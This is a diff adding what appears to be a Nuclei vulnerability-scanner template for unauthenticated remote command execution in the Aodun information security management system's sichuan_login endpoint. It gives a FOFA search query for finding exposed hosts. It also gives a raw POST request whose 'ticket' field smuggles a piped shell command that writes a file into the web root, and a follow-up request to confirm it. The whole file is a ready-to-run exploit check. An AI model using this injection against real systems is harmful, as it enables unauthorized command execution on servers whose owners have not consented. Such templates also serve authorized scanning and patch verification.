@@ -1,0 +1,37 @@
+id: aodun-sichuan_login-RCE
+
+info:
+  name: 傲盾信息安全管理系统前台 sichuan_login 远程命令执行
+  author: changge
+  severity: high
+  metadata:
+    fofa-query: body="傲盾软件" && body="aodun/aodun.js"
+  reference:
+   - https://
+  tags: aodun
+
+variables:
+  file_name: "{{to_lower(rand_text_alpha(8))}}.txt"
+  file_content: "{{to_lower(rand_text_alpha(7))}}"
+
+requests:
+  - raw:
+      - |
+        POST /user_management/sichuan_login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        
+        loginname=sysadmin&ticket=|echo%20{{file_content}}>/adm/isms_web/static/base_static/js/aodun/{{file_name}}
+
+      - |
+        GET /static/base_static/js/aodun/{{file_name}} HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+        - 'contains(body_2, "{{file_content}}")'
